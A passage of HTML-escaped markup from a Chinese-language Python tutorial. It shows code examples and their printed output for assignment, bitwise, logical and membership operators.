&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;赋值运算符&#34;&gt;&lt;a href=&#34;#赋值运算符&#34; class=&#34;headerlink&#34; title=&#34;赋值运算符&#34;&gt;&lt;/a&gt;赋值运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;21&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;

c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; b
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 31&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; a
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 52&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;*=&lt;/span&gt; a
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1092&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;/=&lt;/span&gt; a
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 52.0&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;%=&lt;/span&gt; a
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;**=&lt;/span&gt; a
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2097152&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;//=&lt;/span&gt; a
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 99864&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
c 的值为： 31
c 的值为： 52
c 的值为： 1092
c 的值为： 52.0
c 的值为： 2
c 的值为： 2097152
c 的值为： 99864
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;位运算符&#34;&gt;&lt;a href=&#34;#位运算符&#34; class=&#34;headerlink&#34; title=&#34;位运算符&#34;&gt;&lt;/a&gt;位运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 60 = 0011 1100&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;13&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 13 = 0000 1101&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;

c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; b  &lt;span class=&#34;token comment&#34;&gt;# 12 = 0000 1100&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 12&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; b  &lt;span class=&#34;token comment&#34;&gt;# 61 = 0011 1101&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 61&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; b  &lt;span class=&#34;token comment&#34;&gt;# 49 = 0011 0001&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 49&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;a  &lt;span class=&#34;token comment&#34;&gt;# -61 = 1100 0011&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# -61&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 240 = 1111 0000&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 240&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 15 = 0000 1111&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c 的值为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 15&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
c 的值为： 12
c 的值为： 61
c 的值为： 49
c 的值为： -61
c 的值为： 240
c 的值为： 15
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;逻辑运算符&#34;&gt;&lt;a href=&#34;#逻辑运算符&#34; class=&#34;headerlink&#34; title=&#34;逻辑运算符&#34;&gt;&lt;/a&gt;逻辑运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 都为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 有一个不为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 变量 a 和 b 都为 true&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 都为 true，或其中一个变量为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 都不为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 变量 a 和 b 都为 true，或其中一个变量为 true&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 修改变量 a 的值&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 都为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 有一个不为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 变量 a 和 b 有一个不为 true&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 都为 true，或其中一个变量为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 都不为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 变量 a 和 b 都为 true，或其中一个变量为 true&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 都为 false，或其中一个变量为 false&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 和 b 都为 true&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 变量 a 和 b 都为 false，或其中一个变量为 false    &lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
变量 a 和 b 都为 true
变量 a 和 b 都为 true，或其中一个变量为 true
变量 a 和 b 有一个不为 true
变量 a 和 b 都为 true，或其中一个变量为 true
变量 a 和 b 都为 false，或其中一个变量为 false
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;成员运算符&#34;&gt;&lt;a href=&#34;#成员运算符&#34; class=&#34;headerlink&#34; title=&#34;成员运算符&#34;&gt;&lt;/a&gt;成员运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 在给定的列表中 list 中&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 不在给定的列表中 list 中&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 变量 a 不在给定的列表中 list 中&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 b 不在给定的列表中 list 中&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 b 在给定的列表中 list 中&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 变量 b 不在给定的列表中 list 中&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 修改变量 a 的值&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 在给定的列表中 list 中&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;变量 a 不在给定的列表中 list 中&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 变量 a 在给定的列表中 list 中&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
变量 a 不在给定的列表中 list 中
变量 b 不在给定的列表中 list 中
变量 a 在给定的列表中 list 中
